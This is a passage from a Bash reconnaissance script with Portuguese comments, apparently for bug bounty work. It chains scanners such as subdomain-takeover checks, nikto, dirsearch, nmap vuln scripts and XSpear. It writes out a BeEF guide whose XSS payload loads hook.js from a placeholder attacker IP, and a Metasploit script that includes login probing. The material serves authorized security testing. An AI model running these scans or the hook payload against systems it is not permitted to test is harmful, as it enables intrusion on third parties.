        "helpjuice.com:We could not find what you're looking for"
        "helpscoutdocs.com:No settings were found for this company"
        "surge.sh:project not found"
        "bitbucket.io:Repository not found"
        "zendesk.com:Help Center Closed"
        "teamwork.com:Oops - We didn't find your site"
        "unbounce.com:The requested URL was not found on this server"
        "readme.io:Project doesnt exist"
    )
    
    local count=0
    local total_subs=$(head -n "$max_subs" subs/all_subs.txt | wc -l)
    
    (
        head -n "$max_subs" subs/all_subs.txt | while IFS= read -r subdomain || [[ -n "$subdomain" ]]; do
            [[ -z "$subdomain" ]] && continue
            
            count=$((count + 1))
            
            # Log a cada 50 subdomínios
            if [[ $((count % 50)) -eq 0 ]]; then
                log_info "[$count/$total_subs] Takeover check progress..."
            fi
            
            # Verificar CNAME
            cname=$(timeout 5s dig +short CNAME "$subdomain" 2>/dev/null | head -1)
            
            if [[ -n "$cname" ]]; then
                for pattern in "${takeover_patterns[@]}"; do
                    service="${pattern%%:*}"
                    fingerprint="${pattern##*:}"
                    
                    if echo "$cname" | grep -qi "$service"; then
                        # Verificar se página retorna fingerprint de takeover
                        response=$(timeout "${req_timeout}s" curl -s -L "http://$subdomain" \
                            --connect-timeout 5 \
                            --max-time "${req_timeout}" \
                            2>/dev/null | head -c 5000)
                        
                        if echo "$response" | grep -qi "$fingerprint"; then
                            echo "VULNERABLE: $subdomain -> $cname ($service)" >> "$vulnerable_file"
                            log_warn "🚨 Takeover: $subdomain -> $cname"
                        fi
                    fi
                done
            fi
        done
    ) &
    
    # Wait with global timeout
    local subshell_pid=$!
    if ! timeout "${global_timeout}s" tail --pid="$subshell_pid" -f /dev/null 2>/dev/null; then
        log_error "[!] Takeover checks GLOBAL TIMEOUT (${global_timeout}s) - Killing"
        kill -TERM "$subshell_pid" 2>/dev/null || true
        wait "$subshell_pid" 2>/dev/null || true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] GLOBAL TIMEOUT: Manual takeover checks" >> "$timeouts_file"
    else
        wait "$subshell_pid" 2>/dev/null || true
    fi
    
    # ============= LAZY DIRECTORY CREATION =============
    local has_results=false
    
    if [[ -s "$vulnerable_file" ]]; then
        has_results=true
    fi
    
    if [[ -s "$subjack_file" ]]; then
        # Verificar se subjack encontrou algo (não apenas JSON vazio)
        if [[ $(wc -c < "$subjack_file") -gt 10 ]]; then
            has_results=true
        fi
    fi
    
    if [[ "$has_results" = true ]]; then
        # Criar diretórios permanentes
        mkdir -p reports/takeover logs
        
        [[ -s "$vulnerable_file" ]] && mv "$vulnerable_file" reports/takeover/takeover_vulnerable.txt
        [[ -s "$subjack_file" ]] && [[ $(wc -c < "$subjack_file") -gt 10 ]] && mv "$subjack_file" reports/takeover/subjack_results.json
        [[ -s "$errors_file" ]] && mv "$errors_file" logs/takeover_errors.log
        [[ -s "$timeouts_file" ]] && mv "$timeouts_file" logs/takeover_timeouts.log
        
        local vuln_count=$(wc -l < reports/takeover/takeover_vulnerable.txt 2>/dev/null || echo 0)
        log_success "🎯 $vuln_count subdomain takeover vulnerabilities encontradas"
        
        if [[ "$vuln_count" -gt 0 ]]; then
            send_notification "🚨 *SUBDOMAIN TAKEOVER*
🎯 $vuln_count subdomínios vulneráveis!
📄 Veja: reports/takeover/takeover_vulnerable.txt" "true"
        fi
    else
        log_info "⚠️  Takeover scan completed - No vulnerabilities found (no directories created)"
        # Mover logs se existirem
        if [[ -s "$timeouts_file" ]] || [[ -s "$errors_file" ]]; then
            mkdir -p logs
            [[ -s "$timeouts_file" ]] && mv "$timeouts_file" logs/takeover_timeouts.log
            [[ -s "$errors_file" ]] && mv "$errors_file" logs/takeover_errors.log
        fi
    fi
    
    # Limpar temp
    rm -rf "$temp_dir"
}

# ============= ENDPOINT DISCOVERY (LAZY CREATION) =============
run_endpoint_discovery() {
    # FAIL-FAST: Verificar inputs
    if [[ ! -d js/downloads ]] && [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum JS ou host disponível - pulando endpoint discovery"
        return 0
    fi
    
    log_info "🔥 Executando Endpoint Discovery (Lazy Mode)..."
    
    # Criar diretório temporário
    local temp_dir=$(mktemp -d /tmp/endpoints_scan_XXXXXX)
    local all_endpoints="$temp_dir/all_endpoints.txt"
    local api_endpoints="$temp_dir/api_endpoints.txt"
    local sensitive_endpoints="$temp_dir/sensitive_endpoints.txt"
    local errors_file="$temp_dir/endpoints_errors.log"
    
    # Timeout settings
    local req_timeout=60
    local global_timeout=1200     # 20 min
    local max_js_files=100
    [[ "$PROFILE" = "aggressive" ]] && max_js_files=300
    [[ "$PROFILE" = "kamikaze" ]] && max_js_files=500
    
    # Extrair endpoints de arquivos JS baixados
    if [[ -d js/downloads ]] && [[ "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "▶️  Extraindo endpoints de arquivos JS..."
        
        local js_count=0
        find js/downloads -type f -name "*.js" | head -n "$max_js_files" | while IFS= read -r jsfile; do
            js_count=$((js_count + 1))
            
            # Extrair URLs e paths de arquivos JS
            grep -oP '["'"'"'](/[a-zA-Z0-9_/.-]+)["'"'"']' "$jsfile" 2>/dev/null | \
                tr -d "\"'" | sort -u >> "$all_endpoints" 2>>"$errors_file" || true
            
            # Extrair endpoints de API
            grep -oP '["'"'"'](https?://[^"'"'"']+|/api/[^"'"'"']+|/v[0-9]+/[^"'"'"']+)["'"'"']' "$jsfile" 2>/dev/null | \
                tr -d "\"'" | sort -u >> "$api_endpoints" 2>>"$errors_file" || true
        done
        
        log_info "✅ Analisados $(find js/downloads -type f -name "*.js" | head -n "$max_js_files" | wc -l) arquivos JS"
    fi
    
    # Usar linkfinder se disponível
    if command -v linkfinder >/dev/null 2>&1 && [[ -d js/downloads ]]; then
        log_info "▶️  Usando linkfinder para extração avançada..."
        
        find js/downloads -type f -name "*.js" | head -n "$max_js_files" | while IFS= read -r jsfile; do
            timeout "${req_timeout}s" linkfinder -i "$jsfile" -o cli 2>/dev/null >> "$all_endpoints" || true
        done
    fi
    
    # Identificar endpoints sensíveis
    if [[ -s "$all_endpoints" ]]; then
        log_info "▶️  Identificando endpoints sensíveis..."
        
        grep -iE "(admin|config|backup|debug|test|dev|staging|internal|private|secret|api/v|graphql|auth|login|register|password|token|key|credential|aws|azure|gcp)" \
            "$all_endpoints" 2>/dev/null | sort -u > "$sensitive_endpoints" || true
    fi
    
    # Deduplicar resultados
    if [[ -s "$all_endpoints" ]]; then
        sort -u "$all_endpoints" -o "$all_endpoints"
    fi
    if [[ -s "$api_endpoints" ]]; then
        sort -u "$api_endpoints" -o "$api_endpoints"
    fi
    
    # ============= LAZY DIRECTORY CREATION =============
    local has_results=false
    
    if [[ -s "$all_endpoints" ]]; then
        local endpoint_count=$(wc -l < "$all_endpoints")
        if [[ "$endpoint_count" -gt 0 ]]; then
            has_results=true
        fi
    fi
    
    if [[ "$has_results" = true ]]; then
        # Criar diretórios permanentes
        mkdir -p endpoints logs
        
        [[ -s "$all_endpoints" ]] && mv "$all_endpoints" endpoints/all_endpoints.txt
        [[ -s "$api_endpoints" ]] && mv "$api_endpoints" endpoints/api_endpoints.txt
        [[ -s "$sensitive_endpoints" ]] && mv "$sensitive_endpoints" endpoints/sensitive_endpoints.txt
        [[ -s "$errors_file" ]] && mv "$errors_file" logs/endpoints_errors.log
        
        local total_count=$(wc -l < endpoints/all_endpoints.txt 2>/dev/null || echo 0)
        local api_count=$(wc -l < endpoints/api_endpoints.txt 2>/dev/null || echo 0)
        local sensitive_count=$(wc -l < endpoints/sensitive_endpoints.txt 2>/dev/null || echo 0)
        
        log_success "✅ Endpoint Discovery completo"
        log_info "📊 Total: $total_count endpoints | APIs: $api_count | Sensíveis: $sensitive_count"
        
        if [[ "$sensitive_count" -gt 0 ]]; then
            send_notification "🔍 *ENDPOINT DISCOVERY*
📊 $total_count endpoints encontrados
🔌 $api_count API endpoints
⚠️ $sensitive_count endpoints sensíveis!
📄 Veja: endpoints/sensitive_endpoints.txt" "false"
        fi
    else
        log_info "⚠️  Endpoint discovery completed - No endpoints found (no directories created)"
    fi
    
    # Limpar temp
    rm -rf "$temp_dir"
}

# ============= EXPORTS DAS FUNÇÕES LAZY (após definição) =============
export -f run_ssrfmap
export -f run_takeover_checks
export -f run_endpoint_discovery

log_info "✅ Lazy Creation Functions (SSRF, Takeover, Endpoints) carregadas"

# ============= HTTPROBE - Additional HTTP Probing =============
run_httprobe() {
    if [[ ! -s subs/all_subs.txt ]]; then
        log_info "⚠️  Nenhum subdomínio - pulando httprobe"
        return 0
    fi
    
    if command -v httprobe >/dev/null 2>&1; then
        log_info "▶️  Executando httprobe..."
        mkdir -p reports/httprobe
        
        cat subs/all_subs.txt | timeout 600s httprobe -c "$CONCURRENCY" | tee reports/httprobe/live_hosts.txt
        log_info "✅ httprobe completo"
    fi
}

# ============= GOWITNESS - Screenshot Tool =============
run_gowitness() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando gowitness"
        return 0
    fi
    
    if command -v gowitness >/dev/null 2>&1; then
        log_info "▶️  Executando gowitness para screenshots..."
        mkdir -p screenshots/gowitness
        
        timeout 900s gowitness file -f alive/hosts.txt --destination screenshots/gowitness --threads "$PARALLEL_HOSTS" 2>/dev/null || true
        log_info "✅ gowitness completo - screenshots em screenshots/gowitness/"
    fi
}

# ============= AQUATONE - Visual Inspection =============
run_aquatone() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando aquatone"
        return 0
    fi
    
    if command -v aquatone >/dev/null 2>&1; then
        log_info "▶️  Executando aquatone para screenshots..."
        mkdir -p screenshots/aquatone
        
        cat alive/hosts.txt | timeout 900s aquatone -out screenshots/aquatone -threads "$PARALLEL_HOSTS" 2>/dev/null || true
        log_info "✅ aquatone completo - relatório HTML em screenshots/aquatone/"
    fi
}

# ============= S3SCANNER - AWS S3 Bucket Scanner =============
run_s3scanner() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando s3scanner"
        return 0
    fi
    
    if command -v s3scanner >/dev/null 2>&1; then
        log_info "▶️  Executando s3scanner..."
        mkdir -p reports/s3scanner
        
        # Gerar possíveis nomes de buckets a partir dos domínios
        cat alive/hosts_only.txt | sed 's/\./-/g' | head -50 > reports/s3scanner/bucket_names.txt
        
        timeout 600s s3scanner scan -f reports/s3scanner/bucket_names.txt -o reports/s3scanner/buckets_found.txt 2>/dev/null || true
        log_info "✅ s3scanner completo"
    fi
}

# ============= CLOUD_ENUM - Cloud Asset Discovery =============
run_cloud_enum() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando cloud_enum"
        return 0
    fi
    
    if command -v cloud_enum >/dev/null 2>&1; then
        log_info "▶️  Executando cloud_enum..."
        mkdir -p reports/cloud_enum
        
        # Extrair keywords dos domínios
        head -10 alive/hosts_only.txt | sed 's/\.com.*//;s/\..*$//' | sort -u > reports/cloud_enum/keywords.txt
        
        timeout 600s cloud_enum -k reports/cloud_enum/keywords.txt -l reports/cloud_enum/results.txt 2>/dev/null || true
        log_info "✅ cloud_enum completo"
    fi
}

# ============= NOVAS FERRAMENTAS AVANÇADAS PARA SUPERAR XBOW =============

# ============= INTERACTSH - OAST Testing =============
run_interactsh() {
    if ! command -v interactsh-client >/dev/null 2>&1; then
        log_info "⚠️  interactsh-client não instalado"
        log_info "💡 Instale com: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
        return 0
    fi
    
    log_info "▶️  Configurando Interactsh para OAST testing..."
    mkdir -p logs/interactsh
    
    # Iniciar servidor Interactsh com timeout
    local interactsh_url=""
    interactsh_url=$(timeout 30s interactsh-client -json -n 1 2>/dev/null | jq -r '.domain' 2>/dev/null | head -1 || echo "")
    
    if [[ -n "$interactsh_url" ]] && [[ "$interactsh_url" != "null" ]]; then
        log_success "✅ Interactsh URL gerada: $interactsh_url"
        echo "$interactsh_url" > logs/interactsh/interactsh_url.txt
        
        # Usar com nuclei
        if [[ -s alive/hosts.txt ]]; then
            log_info "🔥 Executando nuclei com Interactsh para OAST..."
            timeout 2h nuclei -l alive/hosts.txt \
                -tags ssrf,oast,dns \
                -iserver "$interactsh_url" \
                -rl "$RATE_LIMIT" -c 20 \
                -o nuclei/nuclei_oast.txt 2>&1 | tee logs/interactsh/nuclei_oast.log || true
        fi
    else
        log_warn "⚠️  Falha ao gerar URL do Interactsh"
    fi
}

# ============= NIKTO - Web Server Scanner =============
run_nikto() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando nikto"
        return 0
    fi
    
    if ! command -v nikto >/dev/null 2>&1; then
        log_info "⚠️  nikto não instalado"
        log_info "💡 Instale com: sudo apt install nikto"
        return 0
    fi
    
    log_info "🔥 Executando Nikto Web Server Scanner..."
    mkdir -p reports/nikto logs
    
    local max_hosts=20
    [[ "$PROFILE" = "light" ]] && max_hosts=5
    [[ "$PROFILE" = "aggressive" ]] && max_hosts=50
    [[ "$PROFILE" = "kamikaze" ]] && max_hosts=100
    
    local count=0
    head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        count=$((count + 1))
        safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
        log_info "[$count/$max_hosts] Nikto scanning: $url"
        
        timeout 600s nikto -h "$url" \
            -Tuning 123456789ab \
            -Format txt \
            -output "reports/nikto/nikto_${safe}.txt" \
            -Cgidirs all \
            -Display V \
            -mutate 4 \
            -Plugins headers,cookies,origin_reflection \
            2>>logs/nikto_errors.log || true
    done
    
    # Consolidar resultados
    if ls reports/nikto/nikto_*.txt >/dev/null 2>&1; then
        cat reports/nikto/nikto_*.txt > reports/nikto/nikto_all_results.txt 2>/dev/null || true
        local vulns=$(grep -i "OSVDB\|CVE\|vulnerability" reports/nikto/nikto_all_results.txt 2>/dev/null | wc -l)
        log_success "✅ Nikto completo - $vulns possíveis vulnerabilidades encontradas"
    fi
}

# ============= DIRSEARCH/DIRB/DIRBUSTER - Directory Brute Force =============
run_directory_bruteforce() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando directory bruteforce"
        return 0
    fi
    
    log_info "🔥 Executando Directory Brute Force..."
    mkdir -p reports/dirsearch reports/dirb logs
    
    local max_hosts=10
    [[ "$PROFILE" = "light" ]] && max_hosts=3
    [[ "$PROFILE" = "aggressive" ]] && max_hosts=25
    [[ "$PROFILE" = "kamikaze" ]] && max_hosts=50
    
    # DIRSEARCH (preferencial)
    if command -v dirsearch >/dev/null 2>&1; then
        log_info "▶️  Executando dirsearch..."
        local count=0
        head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            count=$((count + 1))
            safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
            log_info "[$count/$max_hosts] Dirsearch: $url"
            
            timeout 1200s dirsearch -u "$url" \
                -e php,asp,aspx,jsp,html,js,txt,zip,bak,old,sql \
                -t "${DIRSEARCH_THREADS:-20}" \
                --random-agent \
                --exclude-status=404,403 \
                --format=txt \
                -o "reports/dirsearch/dirsearch_${safe}.txt" \
                2>>logs/dirsearch_errors.log || true
        done
        
        if ls reports/dirsearch/dirsearch_*.txt >/dev/null 2>&1; then
            cat reports/dirsearch/dirsearch_*.txt | grep -E "200|301|302|500" > reports/dirsearch/interesting_paths.txt 2>/dev/null || true
            log_success "✅ Dirsearch completo"
        fi
    
    # DIRB (fallback)
    elif command -v dirb >/dev/null 2>&1; then
        log_info "▶️  Executando dirb..."
        local count=0
        head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            count=$((count + 1))
            safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
            log_info "[$count/$max_hosts] Dirb: $url"
            
            timeout 1200s dirb "$url" /usr/share/wordlists/dirb/common.txt \
                -o "reports/dirb/dirb_${safe}.txt" \
                -r -S -z 10 \
                2>>logs/dirb_errors.log || true
        done
        
        log_success "✅ Dirb completo"
    
    # GOBUSTER (alternativa)
    elif command -v gobuster >/dev/null 2>&1; then
        log_info "▶️  Executando gobuster..."
        local count=0
        head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            count=$((count + 1))
            safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
            log_info "[$count/$max_hosts] Gobuster: $url"
            
            timeout 1200s gobuster dir \
                -u "$url" \
                -w /usr/share/wordlists/dirb/common.txt \
                -t "${DIRSEARCH_THREADS:-20}" \
                -o "reports/dirb/gobuster_${safe}.txt" \
                --random-agent \
                -q \
                2>>logs/gobuster_errors.log || true
        done
        
        log_success "✅ Gobuster completo"
    else
        log_warn "⚠️  Nenhuma ferramenta de directory bruteforce instalada (dirsearch/dirb/gobuster)"
        log_info "💡 Instale com: pip3 install dirsearch OU sudo apt install dirb gobuster"
    fi
}

# ============= TESTSSL.SH - SSL/TLS Scanner =============
run_testssl() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando testssl"
        return 0
    fi
    
    local testssl_path=""
    if command -v testssl.sh >/dev/null 2>&1; then
        testssl_path="testssl.sh"
    elif command -v testssl >/dev/null 2>&1; then
        testssl_path="testssl"
    elif [[ -f "/usr/share/testssl.sh/testssl.sh" ]]; then
        testssl_path="/usr/share/testssl.sh/testssl.sh"
    elif [[ -f "./testssl.sh/testssl.sh" ]]; then
        testssl_path="./testssl.sh/testssl.sh"
    else
        log_info "⚠️  testssl.sh não instalado"
        log_info "💡 Instale com: git clone --depth 1 https://github.com/drwetter/testssl.sh.git"
        return 0
    fi
    
    log_info "🔐 Executando testssl.sh para análise SSL/TLS..."
    mkdir -p reports/testssl logs
    
    local max_hosts=10
    [[ "$PROFILE" = "light" ]] && max_hosts=3
    [[ "$PROFILE" = "aggressive" ]] && max_hosts=20
    [[ "$PROFILE" = "kamikaze" ]] && max_hosts=40
    
    local count=0
    head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        count=$((count + 1))
        safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
        # Extrair host sem protocolo
        host=$(echo "$url" | sed -E 's#^https?://##; s#/.*##')
        log_info "[$count/$max_hosts] testssl: $host"
        
        timeout 600s "$testssl_path" \
            --fast \
            --parallel \
            --severity HIGH \
            --jsonfile "reports/testssl/testssl_${safe}.json" \
            --htmlfile "reports/testssl/testssl_${safe}.html" \
            "$host" > "reports/testssl/testssl_${safe}.txt" 2>>logs/testssl_errors.log || true
    done
    
    # Consolidar vulnerabilidades críticas
    if ls reports/testssl/testssl_*.json >/dev/null 2>&1; then
        jq -r '.scanResult[] | select(.severity=="HIGH" or .severity=="CRITICAL") | "\(.id): \(.finding)"' \
            reports/testssl/testssl_*.json 2>/dev/null > reports/testssl/critical_ssl_issues.txt || true
        local ssl_vulns=$(wc -l < reports/testssl/critical_ssl_issues.txt 2>/dev/null || echo 0)
        log_success "✅ testssl completo - $ssl_vulns vulnerabilidades SSL críticas encontradas"
    fi
}

# ============= XSPEAR - XSS Scanner =============
run_xspear() {
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  Nenhuma URL parametrizada - pulando xspear"
        return 0
    fi
    
    if ! command -v XSpear >/dev/null 2>&1 && ! command -v xspear >/dev/null 2>&1; then
        log_info "⚠️  XSpear não instalado"
        log_info "💡 Instale com: gem install XSpear"
        return 0
    fi
    
    log_info "🔥 Executando XSpear para XSS Detection..."
    mkdir -p reports/xspear logs
    
    local xspear_cmd=$(command -v XSpear || command -v xspear)
    local max_urls=50
    [[ "$PROFILE" = "light" ]] && max_urls=15
    [[ "$PROFILE" = "aggressive" ]] && max_urls=100
    [[ "$PROFILE" = "kamikaze" ]] && max_urls=200
    
    local threads=10
    [[ "$PROFILE" = "light" ]] && threads=3
    [[ "$PROFILE" = "aggressive" ]] && threads=15
    [[ "$PROFILE" = "kamikaze" ]] && threads=20
    
    local count=0
    head -n "$max_urls" urls/with_params.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        count=$((count + 1))
        safe=$(echo "$url" | md5sum | cut -c1-10)
        log_info "[$count/$max_urls] XSpear: $url"
        
        timeout 600s "$xspear_cmd" -u "$url" \
            --threads "$threads" \
            --blind-url "$(cat logs/interactsh/interactsh_url.txt 2>/dev/null || echo 'http://example.com')" \
            --cookie-string "session=test" \
            --Custom-header "X-Forwarded-For: 127.0.0.1" \
            --technique=ATTR,FORM,INJS,TAG \
            -o "reports/xspear/xspear_${safe}" \
            2>>logs/xspear_errors.log || true
    done
    
    # Consolidar XSS encontrados
    if ls reports/xspear/xspear_* >/dev/null 2>&1; then
        grep -rh "VULN\|XSS" reports/xspear/ 2>/dev/null | sort -u > reports/xspear/xss_vulnerabilities.txt || true
        local xss_count=$(wc -l < reports/xspear/xss_vulnerabilities.txt 2>/dev/null || echo 0)
        log_success "✅ XSpear completo - $xss_count possíveis XSS encontrados"
    fi
}

# ============= NMAP NSE VULNERABILITY SCRIPTS =============
run_nmap_vuln_scan() {
    if [[ ! -s ports/hosts_with_ports.txt ]]; then
        log_info "⚠️  No hosts with ports - skipping nmap vuln scan"
        return 0
    fi
    
    if ! command -v nmap >/dev/null 2>&1; then
        log_info "⚠️  nmap not installed"
        log_info "💡 Install with: sudo apt install nmap"
        return 0
    fi
    
    log_info "🔥 Running Nmap NSE Vulnerability Scan..."
    mkdir -p reports/nmap_vulns logs
    
    local timing="${NMAP_TIMING:-3}"
    local max_hosts=20
    [[ "$PROFILE" = "light" ]] && max_hosts=5
    [[ "$PROFILE" = "aggressive" ]] && max_hosts=50
    [[ "$PROFILE" = "kamikaze" ]] && max_hosts=100
    
    # NSE vulnerability scripts
    # IMPORTANT: Exclude broadcast/interface-dependent scripts that cause errors like:
    # "_eap-info: please specify an interface with -e"
    # These scripts require local network interface and fail on remote targets
    local nse_scripts="vuln and not broadcast and not eap-info"
    
    # Add vulscan if installed correctly
    if [[ -f "/usr/share/nmap/scripts/vulscan/vulscan.nse" ]]; then
        nse_scripts="(${nse_scripts}) or vulscan"
        log_info "✅ vulscan.nse detected - adding to scan"
    else
        log_info "⚠️  vulscan.nse not found at /usr/share/nmap/scripts/vulscan/"
    fi
    
    # Exclude problematic scripts that require broadcast or local interface
    # These scripts fail with "please specify an interface with -e" on remote targets
    local exclude_scripts="broadcast-*,eap-info,*-brute,*broadcast*,llmnr-resolve,lltd-discovery,mrinfo,mtrace,targets-*"
    
    local count=0
    head -n "$max_hosts" ports/hosts_with_ports.txt | while IFS= read -r target || [[ -n "$target" ]]; do
        # Skip empty lines
        [[ -z "$target" ]] && continue
        
        count=$((count + 1))
        safe=$(echo "$target" | sed 's/[^a-zA-Z0-9]/_/g')
        log_info "[$count/$max_hosts] Nmap vuln scan: $target"
        
        # Run nmap with explicit exclusion of broadcast/interface-dependent scripts
        if ! timeout 1800s nmap -sV -sC \
            --script="$nse_scripts" \
            --script-args="newtargets=false" \
            --exclude-ports="" \
            -T"$timing" \
            -Pn \
            --max-retries 2 \
            --min-rate 100 \
            --host-timeout 900s \
            -oN "reports/nmap_vulns/nmap_${safe}.txt" \
            -oX "reports/nmap_vulns/nmap_${safe}.xml" \
            "$target" 2>>logs/nmap_vuln_errors.log
        then
            local exit_code=$?
            if [[ $exit_code -eq 124 ]]; then
                log_error "[!] Nmap TIMEOUT (30min) for target: $target - Skipping"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] TIMEOUT: $target" >> logs/nmap_timeouts.log
            else
                log_error "[!] Nmap failed for target: $target (exit: $exit_code) - Skipping"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $target (exit: $exit_code)" >> logs/nmap_errors.log
            fi
            # Continue to next target
            continue
        fi
        
        log_info "[OK] Nmap completed for: $target"
    done
    
    # Consolidate found vulnerabilities
    if ls reports/nmap_vulns/nmap_*.txt >/dev/null 2>&1; then
        grep -rh "VULNERABLE\|CVE-\|EXPLOIT" reports/nmap_vulns/ 2>/dev/null | sort -u > reports/nmap_vulns/critical_vulns.txt || true
        local nmap_vulns=$(wc -l < reports/nmap_vulns/critical_vulns.txt 2>/dev/null || echo 0)
        log_success "✅ Nmap vuln scan complete - $nmap_vulns vulnerabilities detected"
    fi
    
    # Report any errors/timeouts
    if [[ -s logs/nmap_timeouts.log ]]; then
        local timeout_count=$(wc -l < logs/nmap_timeouts.log)
        log_warn "⚠️  $timeout_count targets timed out during nmap scan (see logs/nmap_timeouts.log)"
    fi
}

# ============= WHATWEB/BUILTWITH - Technology Detection Enhanced =============
run_whatweb_enhanced() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando whatweb"
        return 0
    fi
    
    if ! command -v whatweb >/dev/null 2>&1; then
        log_info "⚠️  whatweb não instalado"
        log_info "💡 Instale com: sudo apt install whatweb"
        return 0
    fi
    
    log_info "🔍 Executando WhatWeb Enhanced Technology Detection..."
    mkdir -p tech/whatweb logs
    
    # WhatWeb com agressividade máxima
    timeout 1200s whatweb -i alive/hosts.txt \
        --aggression 3 \
        --log-verbose=tech/whatweb/whatweb_verbose.txt \
        --log-json=tech/whatweb/whatweb_results.json \
        --log-xml=tech/whatweb/whatweb_results.xml \
        -t "${PARALLEL_HOSTS:-5}" \
        2>>logs/whatweb_errors.log || true
    
    # Extrair tecnologias interessantes
    if [[ -s tech/whatweb/whatweb_results.json ]]; then
        jq -r '.[] | "\(.target): \(.plugins | keys | join(", "))"' \
            tech/whatweb/whatweb_results.json 2>/dev/null > tech/whatweb/technologies_summary.txt || true
        
        # Buscar tecnologias vulneráveis conhecidas
        grep -iE "wordpress|joomla|drupal|apache|nginx|php|mysql|jquery|angular|react" \
            tech/whatweb/technologies_summary.txt 2>/dev/null > tech/whatweb/vulnerable_techs.txt || true
        
        local tech_count=$(wc -l < tech/whatweb/technologies_summary.txt 2>/dev/null || echo 0)
        log_success "✅ WhatWeb completo - $tech_count hosts analisados"
    fi
}

# ============= BEEF - Browser Exploitation Framework (PASSIVE VALIDATION) =============
run_beef_passive() {
    if [[ ! -s urls/gf_xss.txt ]] && [[ ! -s reports/xspear/xss_vulnerabilities.txt ]]; then
        log_info "⚠️  Nenhum candidato XSS - pulando BeEF"
        return 0
    fi
    
    log_info "🥩 BeEF - Preparando hooks para validação XSS..."
    mkdir -p reports/beef logs
    
    # Gerar hook URL do BeEF (não inicia servidor - apenas documenta)
    cat > reports/beef/beef_validation_guide.txt <<'BEEFGUIDE'
=== BeEF XSS VALIDATION GUIDE ===

⚠️  IMPORTANTE: Use BeEF apenas para VALIDAR XSS encontrados, com autorização!

1. INICIAR BeEF SERVER (em outra janela):
   cd /usr/share/beef-xss
   sudo ./beef

2. HOOK URL padrão:
   http://YOUR_IP:3000/hook.js

3. PAYLOAD DE VALIDAÇÃO (substitua YOUR_IP):
   <script src="http://YOUR_IP:3000/hook.js"></script>

4. TESTAR XSS CANDIDATES:
BEEFGUIDE
    
    # Listar XSS candidates para validação com BeEF
    if [[ -s urls/gf_xss.txt ]]; then
        echo "" >> reports/beef/beef_validation_guide.txt
        echo "=== XSS CANDIDATES PARA TESTAR ===" >> reports/beef/beef_validation_guide.txt
        head -20 urls/gf_xss.txt >> reports/beef/beef_validation_guide.txt
    fi
    
    if [[ -s reports/xspear/xss_vulnerabilities.txt ]]; then
        echo "" >> reports/beef/beef_validation_guide.txt
        echo "=== XSS CONFIRMADOS (XSpear) ===" >> reports/beef/beef_validation_guide.txt
        head -10 reports/xspear/xss_vulnerabilities.txt >> reports/beef/beef_validation_guide.txt
    fi
    
    cat >> reports/beef/beef_validation_guide.txt <<'BEEFGUIDE2'

5. VALIDAÇÃO MANUAL:
   - Injete o payload BeEF hook nos XSS candidates
   - Acesse a URL injetada em navegador
   - Verifique conexão no painel BeEF (http://127.0.0.1:3000/ui/panel)
   - Credenciais padrão: beef / beef

⚠️  NÃO EXECUTE MÓDULOS AGRESSIVOS DO BEEF!
✅ Use apenas para CONFIRMAR execução de JavaScript

BEEFGUIDE2
    
    log_success "✅ BeEF validation guide gerado: reports/beef/beef_validation_guide.txt"
}

# ============= METASPLOIT - AUXILIARY SCANNERS ONLY (NO EXPLOITS) =============
run_metasploit_validation() {
    if [[ ! -s alive/hosts.txt ]] && [[ ! -s ports/naabu.txt ]]; then
        log_info "⚠️  Nenhum alvo - pulando Metasploit"
        return 0
    fi
    
    if ! command -v msfconsole >/dev/null 2>&1; then
        log_info "⚠️  Metasploit não instalado"
        log_info "💡 Instale com: sudo apt install metasploit-framework"
        return 0
    fi
    
    log_info "🎯 Metasploit - Auxiliares de validação (PASSIVE ONLY)..."
    mkdir -p reports/metasploit logs
    
    # Preparar resource script para scanning passivo
    cat > reports/metasploit/passive_validation.rc <<'MSFRC'
# Metasploit Resource Script - PASSIVE VALIDATION ONLY
# ⚠️  SEM EXPLOITS - Apenas auxiliares de scanning e validação

workspace -a bugbounty_scan

# SSL/TLS Certificate Information
use auxiliary/scanner/ssl/ssl_version
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

# HTTP Header Analysis
use auxiliary/scanner/http/http_version
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

# HTTP Methods Allowed
use auxiliary/scanner/http/options
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

# HTTP Robots.txt Analysis
use auxiliary/scanner/http/robots_txt
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

# HTTP Directory Listing Detection
use auxiliary/scanner/http/dir_listing
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

# HTTP Authentication Detection
use auxiliary/scanner/http/http_login
set RHOSTS file:../../alive/hosts_only.txt
set STOP_ON_SUCCESS true
set THREADS 3
run

